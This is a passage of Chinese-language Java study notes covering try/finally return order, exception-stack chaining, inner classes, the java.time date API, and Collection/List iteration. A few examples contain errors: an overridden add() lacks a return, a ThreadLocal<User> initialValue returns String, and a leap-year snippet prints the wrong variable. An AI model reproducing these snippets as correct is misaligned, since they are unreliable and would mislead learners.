{\n    System.out.println(\"finally语句块中\");\n    return 2;\n  }\n}\n```\n运行结果是：\n```\ntry语句块中\nfinally语句块中\n2\n```\n\n从运行结果中可以发现，try中的return语句调用的函数先于finally中调用的函数执行，也就是说return语句先执行，finally语句后执行，所以，返回的结果是2。return并不是让函数马上返回，而是return语句执行后，将把返回结果放置进函数栈中，此时函数并不是马上返回，它要执行finally语句后才真正开始返回。\n\n# 异常栈\n## 异常栈的阅读方法\n- 异常栈中每个异常都由异常名+细节信息+路径组成。异常名从行首开始（或紧随”Caused by”），紧接着是细节信息（为增强可读性，需要提供恰当的细节信息），从下一行开始，跳过一个制表符，就是路径中的一个位置，一行一个位置。\n- 异常栈中的异常是以FILO的顺序打印，位于打印内容最下方的异常最早被抛出，逐渐导致上方异常被抛出。位于打印内容最上方的异常最晚被抛出，且没有再被捕获。从上到下数，第i+1个异常是第i个异常被抛出的原因cause，以“Caused by”开头。\n- 异常中的路径描述打印顺序也是FILO的顺序打印，位于打印内容最下方的路径是最早经过的，逐渐导致上方路径被经过。从上到下数，第i+1个路径是第i个路径被经过的原因\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131153.png)\n\n## 实战：\n```java\npublic class Main {\n  public static void main(String[] args) {\n    try {\n      process1();\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }\n\n  static void process1() {\n    try {\n      process2();\n    } catch (NullPointerException e) {\n      throw new IllegalArgumentException();\n    }\n  }\n\n  static void process2() {\n    throw new NullPointerException();\n  }\n}\n```\n运行后，打印出的异常栈类似：\n```\njava.lang.IllegalArgumentException\n    at Main.process1(Main.java:15)\n    at Main.main(Main.java:5)\n```\n这说明新的异常丢失了原始异常信息，我们已经看不到原始异常NullPointerException的信息了。\n为了能追踪到完整的异常栈，在构造异常的时候，把原始的Exception实例传进去，新的Exception就可以持有原始Exception信息。对上述代码改进如下：\n\n```java\npublic class Main {\n  public static void main(String[] args) {\n    try {\n      process1();\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }\n\n  static void process1() {\n    try {\n      process2();\n    } catch (NullPointerException e) {\n      throw new IllegalArgumentException(e); //改进地方\n    }\n  }\n\n  static void process2() {\n    throw new NullPointerException();\n  }\n}\n```\n运行上述代码，打印出的异常栈类似：\n```\njava.lang.IllegalArgumentException: java.lang.NullPointerException\n    at Main.process1(Main.java:15)\n    at Main.main(Main.java:5)\nCaused by: java.lang.NullPointerException\n    at Main.process2(Main.java:20)\n    at Main.process1(Main.java:13)\n```\n注意到Caused by: Xxx，说明捕获的IllegalArgumentException并不是造成问题的根源，根源在于NullPointerException，是在Main.process2()方法抛出的。\n在代码中获取原始异常可以使用Throwable.getCause()方法。如果返回null，说明已经是“根异常”了。\n有了完整的异常栈的信息，我们才能快速定位并修复代码的问题。\n\n\n# 内部类\n广义上的内部类可以分为下面四种：\n- 成员内部类\n- 静态内部类\n- 方法(局部)内部类\n- 匿名内部类\n\n## 成员内部类\n- 在一个类中除了可以定义成员变量、成员方法，还可以定义类，这样的类就被称为成员内部类，这个类所在的类称为外部类\n- 成员内部类可以访问外部类的所有成员，外部类要访问成员内部类的成员，必须要创建一个成员内部类的对象，再通过指向这个对象的引用来访问\n- 当成员内部类拥有和外部类同名的成员变量或者方法时，在成员内部类中，默认情况下访问的是成员内部类的成员\n- 如果访问外部类的同名成员，需要以`外部类.this.成员变量/方法`形式来访问\n- 成员内部类是依附外部类而存在的，如果要创建成员内部类的对象，前提是必须存在一个外部类的对象\n- 创建成员内部类对象的三种方法\n```java\n// 第一种\nOuter.Inner in = new Outer().new Inner();\n\n//第二种\nOuter out = new Outer();\nOuter.Inner in = out.new Inner();\n\n//第三种\nOuter out = new Outer();\nOuter.Inner in = out.getInnerInstance();\n```\n\n## 静态内部类\n- 可以使用static关键字来修饰一个成员内部类，此时就称为静态内部类。它可以在不创建外部类对象的情况下被实例化，创建静态内部类对象的具体语法格式如下\n```java\nOuter.Inner in = new Outer.Inner();\n```\n- 静态内部类只能访问外部类的静态成员\n- 静态内部类中可以定义静态成员，而非静态内部类中不能定义静态成员\n\n## 方法内部类\n- 方法内部类是在成员方法中定义的类，只能在当前方法中被使用\n- 方法内部类对象不能使用该内部类所在方法中的非final局部变量, 但注意，在jdk1.7之前需要手动将方法内部类使用的变量设置为final, 而在jdk1.7之后，jvm会自动将其设置为final, 而不需要手动添加final\n\n## 匿名内部类\n- 匿名内部类就是没有名字的方法内部类，不使用关键字class、extends、implements没有构造方法\n- 一定是在new的后面，用其隐含**实现一个接口或者继承一个类**\n```java\nclass Dog{\n  public void get(){\n    System.out.println(\"fdfd\");\n  }\n}\npublic class Te<T> {\n  public static void main(String[] args) throws Exception{\n    Dog dog = new Dog(){\n      public void get(){\n        System.out.println(\"aaa\");\n      }\n    };\n    dog.get();//输出: aaa\n  }\n}\n```\n\n### 诡异的Java匿名内部类写法\n在很多时候，我们需要在类的内部初始化一个静态的Map或者List，然后保存一下常量值提供给类内部方法使用。 我们通常的做法是：\n\n首先初始化一个Map的静态变量，然后在静态块添加常量值：\n```java\nprivate final static Map<String, String> CONSTANT = new HashMap<String, String>();\nstatic {\n\tCONSTANT.put(\"1\", \"one\");\n\tCONSTANT.put(\"2\", \"two\");\n}\n```\n\n#### 一、你也许会陌生的匿名内部类写法\n```java\nprivate final static Map<String, String> CONSTANT =\n     new HashMap<String, String>() {\n\t{\n\t\tput(\"1\", \"one\");\n\t\tput(\"2\", \"two\");\n\t}\n};\n```\n\n#### 二、先看看我们熟悉的写法\n如果对于这种方式比较陌生，那先看两个熟悉的\n- 熟悉1\n```java\nnew Thread() {\n    public void run() {\n        System.out.println(\"Thread running!\");\n    };\n}.start();\n```\n上面这段代码的意思就是，声明一个Thread的子类并重写Thread的run()方法， 然后创建一个该子类的实例然后调用其start()方法。 由于声明的该Thread的子类没有名字，所以叫匿名类。 又由于没有名字的类只能存在于一个类或者一个方法内部，所以又称为匿名内部类。\n\n- 熟悉2\n```java\nThread thread = new Thread() {\n    public void run() {\n        System.out.println(\"Thread running!\");\n    };\n};\nthread.start();\n```\n唯一的区别就是不是直接创建子类并调用其方法，而是声明一个该子类的父类引用thread，然后通过该父类引用调用子类方法。 创建完匿名类的实例后，没有立即执行start()，创建实例和执行实例的方法分开。\n\n两者的区别相当于：\n```java\n//1\nnew User().setName(\"Boyce Zhang\");\n//2\nUser user = new User();\nuser.setName(\"Boyce Zhang\");\n```\n\n#### 三、那个陌生的写法究竟是个什么鬼？\n我们将熟悉的写法稍加改变\n```java\nnew Thread() {\n    public void run() {\n        System.out.println(\"Thread running!\");\n    };\n    {\n        start();\n    }\n};\n```\n实际上这种写法就是在匿名子类的类局部代码块中调用其类方法。局部代码块内的语句是在创建该类的实例后由类加载器隐式立即执行的。相当于：\n```java\npublic class MyThread extends Thread {\n    {\n        start();\n    }\n    public void run() {\n        System.out.println(\"Thread running!\");\n    };\n}\n```\n所以三种方式在执行的时刻上略微的差别之外，效果并没有太大的区别。\n\n这样一来，前面初始化Map的方式就不难理解了:\n```java\nprivate final static Map<String, String> CONSTANT = new HashMap<String, String>() {\n    {\n        put(\"1\", \"one\");\n        put(\"2\", \"two\");\n    }\n};\n```\n原理就是： \n声明并实例化一个HashMap的子类（子类没有重写父类HashMap的任何方法），并且在子类的类局部代码块调用父类HashMap的put()方法。 最后声明一个Map接口引用CONSTANT指向实例化的HashMap子类的实例。 根据前面的例子我们知道，类局部代码块中的put()方法调用将在HashMap的匿名子类被实例化后由类加载器隐式的执行。\n\n#### 四、举一反三\n其实,对于Java的任何类或接口，都可以声明一个匿名类继承或实现它。如：\n```java\n//重写父类方法，局部代码块调用自己重写过的父类方法。\nList<String> list = new ArrayList<String>() {\n    public boolean add(String e) {\n        System.out.println(\"Cannot add anything!\");\n    }\n\n    //代码块的顺序在前后都无所谓，可以出现在类范围的任何位置。\n    {\n        add(\"Boyce Zhang\");\n    }\n};\n\n//局部代码块调用父类方法。\ndao.add(new User(){\n    {\n        setName(\"Boyce Zhang\");\n        setAge(26);\n    }\n});\n\n//重写父类方法\nThreadLocal<User> threadLocal = new ThreadLocal<User>() {\n    protected String initialValue() {\n        return new User(\"Boyce Zhang\", 26);\n    }\n};\n```\n在匿名类的内部我们不但可以实现或重写其父类的方法。 而且也可以在其类的局部代码块中执行自己的方法或者其父类的方法。 这并不是匿名内部类的特殊语法，而是Java的语法，对于任何类都适用。\n\n\n#### 五、这种写法的优缺点分析\n这种写法常常就是用在实例化一个类后立即执行某些方法做一些类实例的数据初始化什么的。 \n其作用和先实例化一个类，在使用其引用调用需要立即调用的方法是一样的，如：\n```java\nMap<String, String> map = new HashMap<String, String>();\nmap.put(\"1\", \"one\");\nmap.put(\"2\", \"two\");\n```\n这种语法的优点就是简单，实例化一个类后立即做一些事情，比较方便。 效果有一点儿像Javascript里的即时函数一样。但是有本质的区别。 因为Javascript没有类的概念，或者说Javascript中function就是类，类就是function， 所以即时函数是加载完后执行整个function。而Java的局部代码块是可以选择执行类的任何方法。\n\n当然这种写法也有其缺点： \n每一个内部类的实例都会隐性的持有一个指向外部类的引用（静态内部类除外）， 这样一方面是多余的引用浪费，另一方面当串行化这个子类实例时外部类也会被不知不觉的串行化， 如果外部类没有实现serialize接口时，就会报错。\n\n\n# 日期时间API\n## JDK8之前日期时间API\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131224.png)\n\n### java.lang.System类\nSystem类提供的`public static long currentTimeMilis()`用来返回当前时间与1970年1月1日0时0分0秒之间以毫秒为单位的时间差。\n**此方法适于计算时间差。**\n\n- 计算世界时间的主要标准有：\n>UTC（Coordinated Universal Time）\n>GMT（Greenwich Mean Time）\n>CST（Central Standard Time）\n\n### java.util.Date类\n表示特定的瞬间，精确到毫秒\n**构造器**\n- Date()：使用无参构造器创建的对象可以获取本地当前时间。\n- Date(long date)\n\n**常用方法**\n- getTime()：返回自1970年1月1日00:00:00 GMT以来此Date对象表示的毫秒数。\n- toString()：把此Date对象转换为以下形式的String: dow mon dd hh:mm:ss zzz yyyy其中：dow是一周中的某一天（Sun，Mon，Tue Wed，Thu，Fri，Sat），zzz是时间标准。\n- 其它很多方法都过时了。\n\n### java.text.SimpleDateFormat类\n- Date类的API不易于国际化，大部分被废弃了，java.text.SimpleDateFormat类是一个不与语言环境有关的方式来格式化和解析日期的具体类。\n- 它允许进行格式化：日期->文本。解析：文本->日期\n**格式化：**\n- SimpleDateFormat()：默认的模式和语言环境创建对象\n- public SimpleDateFormat(String pattern)：该构造方法可以用参数pattern指定的格式创建一个对象，该对象调用：\n- public String format（Date date）：方法格式化时间对象date\n**解析：**\n- public Date parse(String source)：从给定字符串的开始解析文本，以生成一个日期。\n\n### java.util.Calendar（日历）类\nCalendar是一个抽象基类，主用用于完成日期字段之间相互操作的功能。\n\n**获取Calendar实例的方法**\n- 使用Calendar.getlnstance()方法\n- 调用它的子类GregorianCalendar的构造器。\n\n一个Calendar的实例是系统时间的抽象表示，通过get(int field)方法来取得想要的时间信息。比如YEAR、MONTH、DAY_OF_WEEK、HOUR_OF_DAY、MINUTE、SECOND\n- public void set(int field，int value)\n- public void add(int field，int amount)\n- public final Date getTime()\n- public final void setTime(Date date)\n\n注意:\n- 获取月份时：一月是0，二月是1，以此类推，12月是11\n- 获取星期时：周口是1，周二是2，。。。。周六是7\n\n## jdk8中的新日期时间API\n### 新日期时间API出现的背景\n如果我们可以跟别人说：“我们在1502643933071见面，别晚了！”， 那么就再简单不过了。但是我们希望时间与昼夜和四季有关，于是事情就变复杂了。JDK1.0中包含了一个java.util.Date类，但是它的大多数方法已经在JDK1.1引入Calendar类之后被弃用了。而Calendar并不比Date好多少。它们面临的问题是：\n- 可变性：像日期和时间这样的类应该是不可变的。\n- 偏移性：Date中的年份是从1900开始的，而月份都从0开始。\n- 格式化：格式化只对Date有用，Calendar则不行。\n- 此外，它们也不是线程安全的；不能处理间秒等。\n总结：对日期和时间的操作一直是Java程序员最痛苦的地方之一。\n\n第三次引入的API是成功的，并且Java 8中引入的java.time APl已经纠正了过去的缺陷，将来很长一段时间内它都会为我们服务。\nJava8吸收了Joda-Time的精华，以一个新的开始为Java创建优秀的APl。\n新的java.time中包含了所有关于本地日期（LocalDate）、本地时间（LocalTime）、本地日期时间（LocalDateTime）、时区（ZonedDateTime）和持续时间（Duration）的类。历史悠久的Date类新增了tolnstant（）方法，用于把Date转换成新的表示形式。这些新增的本地化时间口期API大大简化了日期时间和本地化的管理。\n\n### LocalDate、LocalTime、LocalDateTime\nLocalDate、LocalTime、LocalDateTimel类是其中较重要的几个类，它们的实例是**不可变的对象**，分别表示使用ISO-8601日历系统的日期、时间、日期和时间。\n它们提供了简单的本地日期或时间，并不包含当前的时间信息，也不包含与时区相关的信息。\n- LocalDate代表IOS格式（yyyy-MM-dd）的日期，可以存储生日、纪念日等日期。\n- LocalTime表示一个时间，而不是日期。\n- LocalDateTime是用来表示日期和时间的，**这是一个最常用的类之一**。\n\n### DateTimeFormatter\njava.time.format.DateTimeFormatter类：该类提供了三种格式化方法：\n- 预定义的标准格式。如： ISO_LOCAL_DATE_TIME；ISO_LOCAL_DATE；ISO_LOCAL_TIME\n- 本地化相关的格式。如：ofLocalizedDateTime(FormatStyle.LONG)\n- 自定义的格式。如：ofPattern(\"yyyy-MM-dd hh:mm:ss E”)\n\n| 方法                       | 描述                                                |\n| -------------------------- | --------------------------------------------------- |\n| ofPattern(String pattern)  | 静态方法，返回一个指定字符串格式的DateTimeFormatter |\n| format(TemporalAccessor t) | 格式化一个日期、时间，返回字符串                    |\n| parse(CharSequence text)   | 将指定格式的字符序列解析为一个日期、时间            |\n\n## 前言\njdk8之前日期时间相关的操作大多用的是Date类或者Calendar类。\n比如：\n```java\nDate date = new Date();\nSimpleDateFormat df = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\nSystem.out.println(df.format(date)); //2020-09-22 09:19:44\n```\n\nDate类或者Calendar类的缺点：\n- 非线程安全 ： java.util.Date 是非线程安全的，所有的日期类都是可变的，这是Java的日期类最大的问题之一。\n- 设计很差 ：Java的日期时间类的定义并不一致，在 java.util 和 java.sql 的包中都有日期类，此外用于格式化和解析的类在 java.text 包中定义。java.util.Date 同时包含日期和时间，而 java.sql.Date 仅包含日期，将其纳入java.sql包并不合理。另外这两个类都有相同的名字，这本身就是一个非常糟糕的设计。\n- 时区处理麻烦 ： 日期类并不提供国际化，没有时区支持，因此Java引入了java.util.Calendar 和 java.util.TimeZone 类，但他们同样存在上述所有的问题。\n- jd8以后增加了 LocalDate和 Zoned，能更方便优雅的处理日期时间，本文主要介绍这两者。\n\n### 获取当前时间\n- LocalDate获取当前年、月、日\n```java\nLocalDate nowdata = LocalDate.now();\nSystem.out.println(nowdata);   //2021-04-06。获取当前年月日\nSystem.out.println(nowdata.getYear());//2021。获取年份\nSystem.out.println(nowdata.getMonth().getValue());//4。获取月份\nSystem.out.println(nowdata.getDayOfMonth());//6。获取今天几号\nSystem.out.println(nowdata.getDayOfWeek().getValue());//2。获取今天星期几\nSystem.out.println(nowdata.getDayOfYear());//96。获取今天是今年的第几天\n```\n\n- LocalTime获取当前时、分、秒\n```java\nLocalTime nowTime = LocalTime.now();\nSystem.out.println(nowTime.getHour());//9。获取当前时间的小时\nSystem.out.println(nowTime.getMinute());//40。获取当前时间的分钟\nSystem.out.println(nowTime.getSecond());//44。获取当前时间的秒\n```\n\n- LocalDateTime获取当前年、月、日、时、分、秒\n（LocalDateTime相当于LocalDate + LocalTime的合体）\n```java\nLocalDateTime localDateTime = LocalDateTime.now();\nSystem.out.println(localDateTime.getYear());//2021。年\nSystem.out.println(localDateTime.getMonth().getValue());//4。月\nSystem.out.println(localDateTime.getDayOfMonth());//6。日\nSystem.out.println(localDateTime.getHour());//9。时\nSystem.out.println(localDateTime.getMinute());//51。分\nSystem.out.println(localDateTime.getSecond());//11。秒\nSystem.out.println(localDateTime.getDayOfYear());//96。今天是今年的第几天\nSystem.out.println(localDateTime.getDayOfWeek().getValue());//2。今天是星期几\n```\n\n### 日期和时间格式化\n- LocalDate格式化\n```java\nLocalDate getdata = LocalDate.now();\nDateTimeFormatter f1 = DateTimeFormatter.ofPattern(\"yyyy.MM.dd\");\nSystem.out.println(getdata.format(f1));//2021.04.06\n```\n\n- LocalTime格式化\n```java\nLocalTime getTime = LocalTime.now();\nDateTimeFormatter f1 = DateTimeFormatter.ofPattern(\"HH-mm-ss\");\nSystem.out.println(getTime.format(f1));//16-27-08\n```\n\n- LocalDateTime 格式化\n```java\nLocalDateTime localDateTime = LocalDateTime.now();\nDateTimeFormatter f1 = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\nSystem.out.println(localDateTime.format(f1));//2021-04-06 10:04:32\n```\n```java\nLocalDateTime localDateTime = LocalDateTime.now();\nDateTimeFormatter f2 = DateTimeFormatter.ofPattern(\"yyyy.MM.dd-HH:mm\");\nSystem.out.println(localDateTime.format(f2));//2021.04.06-10:04\n```\n```java\nLocalDateTime localDateTime = LocalDateTime.now();\nSystem.out.println(localDateTime.toString());//2021-04-06T11:33:59.617\n```\n\n### 添加时区：\n```java\nLocalDateTime localDateTime = LocalDateTime.now();\nOffsetDateTime date =localDateTime.atOffset(ZoneOffset.ofHours(+8));\nSystem.out.println(date.toString());//2021-04-06T10:55:09.599+08:00\n```\n注意：\nLocalDateTime 当秒数刚好为0的时候格式化后秒会被省略，格式化要指定到秒。\n```java\nLocalDateTime localDateTime = LocalDateTime.parse(\"2021-04-06T10:00:00\");\n\nString time = localDateTime.toString();\nSystem.out.println(time);//2021-04-06T10:00\n\nDateTimeFormatter f = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\nString time1 = localDateTime.format(f);\nSystem.out.println(time1);//2021-04-06 10:00:00\n```\n\n## 字符串与LocalDate、LocalTime、LocalDateTime之间的互换\n- 日期字符串转LocalDate类型\n```java\nLocalDate getdata = LocalDate.parse(\"2021-04-06\");//年月日用-分开，月份和日期如果小于10要补零,否则会报错\nSystem.out.println(getdata);//2021-04-06\n```\n- 时间字符串转LocalTime类型\n```java\n//时间字符串转LocalTime类型\nLocalTime gettime = LocalTime.parse(\"16:59:09\");//时分秒用:分开，时分秒如果小于10要补零\nSystem.out.println(gettime);\n```\n- 日期时间字符串转LocalDateTime类型\n（年月日之间要用-分割，时分秒用:分割，日期和时间之间用T分割）\n```java\nLocalDateTime localDateTime = LocalDateTime.parse(\"2021-04-06T10:13:12\");\nSystem.out.println(localDateTime);//2021-04-06T10:13:12\n```\n- LocalDate、LocalTime、LocalDateTime类型转为字符串直接toString\n```java\nLocalDate nowdata = LocalDate.now();\nSystem.out.println(nowdata.toString());//2021-04-16\n\nLocalTime nowTime = LocalTime.now();\nSystem.out.println(nowTime.toString());//16:16:04.372\n\nLocalDateTime localDateTime = LocalDateTime.now();\nSystem.out.println(localDateTime.toString());//2021-04-16T16:16:04.373\n```\n## 判断平年和闰年\n- 指定具体年月日\n```java\nLocalDate localDate = LocalDate.of(1999,1,7);//设置指定日期\nboolean bo = localDate.isLeapYear();//闰年为ture,平年是false\nSystem.out.println(bo);//false\n```\n- 指定年份\n```java\nboolean bo1 = IsoChronology.INSTANCE.isLeapYear(1999);//指定年份\nSystem.out.println(bo);//false\n```\n\n## 判断指定日期是不是星期一\n```java\nLocalDate localDate = LocalDate.of(2021,1,25);\nSystem.out.println(localDate.getDayOfWeek()== DayOfWeek.MONDAY);//true\n```\n## 计算指定日期的月份有多少天\n```java\nLocalDate endDate = LocalDate.of(2021, 2, 1);\nint monthDay = endDate.lengthOfMonth();\nSystem.out.println(monthDay);//输出28，2021年2月有28天\n```\n## 比较两个时间的早晚\n```java\nLocalTime gettimeStart = LocalTime.parse(\"00:01:40\");\nLocalTime gettimeEnd = LocalTime.parse(\"00:03:20\");\n//-1表示早于，1表示晚于，0则相当\nint value = gettimeStart.compareTo(gettimeEnd);\nSystem.out.println(value);\n```\n## 计算两个时间相差多久\n```java\nLocalTime gettimeStart = LocalTime.parse(\"00:01:40\");\nLocalTime gettimeEnd = LocalTime.parse(\"00:03:20\");\nSystem.out.println(\"相差: \"+HOURS.between(gettimeStart, gettimeEnd)+\"小时\");//相差: 0小时\nSystem.out.println(\"相差: \"+MINUTES.between(gettimeStart, gettimeEnd)+\"分钟\");//相差: 1分钟\nSystem.out.println(\"相差: \"+SECONDS.between(gettimeStart, gettimeEnd)+\"秒\");//相差: 100秒\n```\n如果要计算出xx:xx:xx秒这样的结果：\n```java\n/**\n     * 计算两个时间的时间差\n     *\n     * @param startime 开始时间，如：00:01:09\n     * @param endtime  结束时间，如：00:08:27\n     * @return  返回xx:xx:xx形式，如：00:07:18\n     */\n    public static String calculationEndTime(String startime, String endtime) {\n        LocalTime timeStart = LocalTime.parse(startime);\n        LocalTime timeEnd = LocalTime.parse(endtime);\n        long hour = HOURS.between(timeStart, timeEnd);\n        long minutes = MINUTES.between(timeStart, timeEnd);\n        long seconds = SECONDS.between(timeStart, timeEnd);\n        minutes = minutes > 59 ? minutes % 60 : minutes;\n        String hourStr = hour < 10 ? \"0\" + hour : String.valueOf(hour);\n        String minutesStr = minutes < 10 ? \"0\" + minutes : String.valueOf(minutes);\n        long getSeconds = seconds - (hour * 60 + minutes) * 60;\n        String secondsStr = getSeconds < 10 ? \"0\" + getSeconds : String.valueOf(getSeconds);\n        return hourStr + \":\" + minutesStr + \":\" + secondsStr;\n    }\n```\n\n## 比较两个日期的早晚\n```java\nLocalDate startDate = LocalDate.of(2020, 1, 18);\nLocalDate endDate = LocalDate.of(2021, 5, 17);\nPeriod period = Period.between(startDate, endDate);\n//判断startDate是不是早于endDate，早于则false，否则true\nSystem.out.println(period.isNegative());//false\n```\n\n## 计算两个日期相隔多久\n```java\nLocalDate startDate = LocalDate.of(2020, 9, 27);\n        LocalDate endDate = LocalDate.of(2030, 10, 2);\n        System.out.println(\"总相差的天数:\" + startDate.until(endDate, ChronoUnit.DAYS));//总相差的天数:3657\n        System.out.println(\"总相差的月数:\" + startDate.until(endDate, ChronoUnit.MONTHS));//总相差的月数:120\n        System.out.println(\"总相差的年数:\" + startDate.until(endDate, ChronoUnit.YEARS));//总相差的年数:10\n        Period period = Period.between(startDate, endDate);\n        System.out.println(\n            \"相差:\" + period.getYears() + \" 年 \" +\n                   period.getMonths() + \" 个月 \" +\n                   period.getDays() + \" 天\");  //相差:10 年 0 个月 5 天\n```\n\n## 比较两个日期时间的早晚\n```java\n        LocalDateTime date = LocalDateTime.parse(\"2019-03-03T12:30:30\");\n        LocalDateTime date1 = LocalDateTime.parse(\"2017-03-03T12:30:30\");\n        System.out.println(date.isAfter(date1));//true\n        System.out.println(date.isBefore(date1));//false\n        System.out.println(date.isEqual(date1));//false\n```\n\n## 计算某年某月有几个星期五\n```java\npublic static void main(String[] args) {\n        int a=numberOfDaysOfWeekInMonth(DayOfWeek.FRIDAY, YearMonth.of(2020, 9));\n        System.out.println(a);\n}\n\npublic static int numberOfDaysOfWeekInMonth(DayOfWeek dow, YearMonth yearMonth) {\n      LocalDate startOfMonth = yearMonth.atDay(1);\n      LocalDate first = startOfMonth.with(TemporalAdjusters.firstInMonth(dow));\n      LocalDate last = startOfMonth.with(TemporalAdjusters.lastInMonth(dow));\n      return (last.getDayOfMonth() - first.getDayOfMonth()) / 7 + 1;\n  }\n```\n说明：\n- DayOfWeek.FRIDAY： DayOfWeek枚举类中的星期五\n- YearMonth.of：此方法接收一个年份和月份，返回一个YearMonth类型\n- yearMonth.atDay：此方法接收一个指定的号数（范围1到366），返回LocalDate类型（即年月日）\n- with：方法返回此日期的调整副本。\n- TemporalAdjusters.firstInMonth：接收一个星期几参数，返回当前月份中第一个星期几的年月日\n- TemporalAdjusters.lastInMonth：接收一个星期几参数，返回当前月份中最后一个星期的年月日\n\n# 集合\n## 什么是集合\n- 概念：对象的容器，定义了对多个对象进行操作的常用方法。可实现数组的功能。\n- 和数组区别：\n  - 数组长度固定，集合长度不固定\n  - 数组可以存储基本类型和引用类型，集合只能存储引用类型，\n- 位置：`java.util.*`；\n\n## Collection体系集合\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130431.png)\n\n## Collection父接口\nCollection接口实现了Iterable接口\n- 特点：代表一组任意类型的对象，无序、无下标、不能重复。\n- 常见方法：\n  - boolean add（Object obj）/添加一个对象。\n  - boolean addA11（Collection o）/将一个集合中的所有对象添加到此集合中。\n  - void clear（）//清空此集合中的所有对象，但对象还是存在内存中\n  - boolean contains（Object o）//检查此集合中是否包含o对象\n  - boolean equals（Object o）∥比较此集合是否与指定对象相等。\n  - boolean isEmpty（）//判断此集合是否为空\n  - boolean remove（Object o）//在此集合中移除o对象， 是根据对象中的equals方法来判断的\n  - int size（）/返回此集合中的元素个数\n  - Iterator\\<E> iterator() //返回该集合迭代器\n  - Object[] toArray（）/将此集合转换成数组。\n[详细](https://docs.oracle.com/javase/8/docs/api/java/util/Collection.html)\n\n### 遍历Collection\n由于Collection是没有下标的，所以是不可能通过for循环下标来遍历Collection的。 \n遍历Collection常用两种方法\n1. 增强For\n```java\nfor(Object object : collection){\n\tSystem.out.println(object);\n}\n```\n2. 使用迭代器Iterator\n迭代其是一个接口， 是专门用来遍历集合的，其有只有三种方法，分别是\n- boolean hasNext(): 如果仍有元素可以迭代，则返回true\n- E next(): 返回迭代的下一个元素\n- void remove(): 从迭代器指向的collection中移除迭代器返回的最后一个元素\n```java\nIterator it = collection.iterator();\nwhile(it.hasNext()){\n\tObject s = it.next();\n\tSystem.out.println(s);\n}\n```\n注：在使用的迭代器遍历集合的过程中，是不能使用集合自带的删除方法进行删除操作的，即`collection.remove(o)`操纵，否则会报如下错误\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130454.png)\n但是我们可以使用的迭代器中的remove方法来进行删除\n\n### Iterator与Iterable的区别\nIterator与Iterable都是接口，他们是紧密相连的，Iterator是迭代器，用来遍历集合的。Collection接口实现了Iterable接口，而没有实现Iterator接口。因为Iterable接口中有一个方法`Iterator<T> iterator()`, 调用这个方法就可以返回一个Iterator类型对象，然后就可以遍历集合了\nMap没有实现Iterable接口，所以Map也就没有Iterator()方法，但是Map有keySet()和entrySet()方法，这两个方法可以转为Set，由于Set实现了Collection，所以从而就有了Iterator()方法\n\n注：在jdk1.8后，Iterable接口添加了`void forEach(Comsumer<? super T> action)`方法，所以集合可以直接使用forEach方法来遍历元素\n```java\npublic static void test10(){\n  ArrayList<Integer> list = new ArrayList();\n  list.add(13);\n  list.add(12);\n  list.add(14);\n  list.forEach(System.out::println);\n}\n```\n\n为什么我们不直接Implement Iterator 呢？\n答: 如果Collection直接实现Iterator这个接口的时候，则当我们new 一个新的对象的时候，这个对象中就包含了当前迭代位置的数据（指针），当这个对象在不同的方法或者类中传递的时候，当前传递的对象的迭代的位置是不可预知的，那么我们在调用next（）方法的时候也就不知道是指到那一个元素。如果其中加上了一个reset（）方法呢？用来重置当前迭代的位置这样Collection也只能同时存在一个当前迭代位置的对象。所有不能直接选择实现 Iterator。 实现Iteratable ，里面的方法Iterator() 可以在同一个对象每次调用的时候都产生一个新的Iterator对象。这样多个迭代器就不会互相干扰了。\n\n## List子接口\n- 特点：有序、有下标、元素可以重复。\n- 常用方法：\n  - void add（int index，Object o）/在index位置插入对象o。\n  - boolean addA11（int index，Collection c）//将一个集合中的元素添加到此集合中的index位置。\n  - Object get（int index）//返回集合中指定位置的元素。\n  - int\tindexOf(Object o) //返回对象o在集合中的下标\n  - ListIterator\\<E> listIterator() // 返回列表迭代器\n  - List subList（int fromIndex，int toIndex）//返回fromIndex和toIndex之间的集合元素。\n[详细](https://docs.oracle.com/javase/8/docs/api/java/util/List.html)\n\n### remove方法\n一定要注意List接口中remove方法有如下两种写法：\n- `E remove(int index);`\n- `boolean remove(Object o);`\n很明显List会根据你所传入的参数类型来选择对应的remove方法，如果传的是int类型，就是对应`remove(int index)`, 如果传的是引用类型，则对应的是`remove(Object o)`。\n\n正是由于这样，所以当你创建了`List<Integer>`类型的对象，并且想要调用`remove(Integer o)`方法来删除指定的元素时，一定要注意了，如果你传的是int类型，则会调用`remove(int index)`方法，则删除的是对应下标的元素。如下例子：\n\n```java\nList<Integer> list = new ArrayList<>();\nlist.add(5);\nlist.add(6);\nlist.add(8);\nlist.add(1);\nlist.add(9);\n\nlist.remove(1);\nSystem.out.println(list); // [5, 8, 1, 9]\nlist.remove((Integer) 1);\nSystem.out.println(list); // [5, 8, 9]\n```\n\n### 遍历List\n由于List是有下标的，所以可以使用for循环遍历下标的方式遍历List；\n当然也可以使用增强for， 迭代器Iterator方法来遍历； 并且List除了有迭代器Iterator, 还有特有的列表迭代器ListIterator\n\n**ListIterator**\n允许程序员按任一方向遍历列表、选代期间修改列表，并获得迭代器在列表中的当前位置。Listlterator没有当前元素；它的光标位置始终位于调用previous0所返回的元素和调用next0所返回的元素之间。长度为n的列表的迭代器有n+l个可能的指针位置\nListIterator接口有如下方法\n- void add(E e) : 将指定的元素插入列表\n- boolean hasNext() : 以正向遍历列表时，如果列表迭代器有多个元素，则返回true\n- boolean hasPrevious() : 如果以逆向遍历列表，列表迭代器有多个元素，则返回true.\n- E next() : 返回列表中的下一个元素\n- int nextIndex() : 返回对next的后续调用所返回元素的索引。\n- E previous() : 返回列表中的前一个元素\n- int previousIndex() : 返回对previous的后续调用所返回元素的索引。\n- void remove() : 从列表中移除由next或previous返回的最后一个元素\n- void set(E e): 用指定元素替换next或previous返回的最后一个元素\n\n### List实现类-ArrayList\nArrayList是通过数据结构实现，查询快，增删慢， 运行效率快，线程不安全. jdk1.2版本添加进来， \n```java\npublic class ArrayList<E> extends AbstractList<E> implements List<E>, RandomAccess, Cloneable, 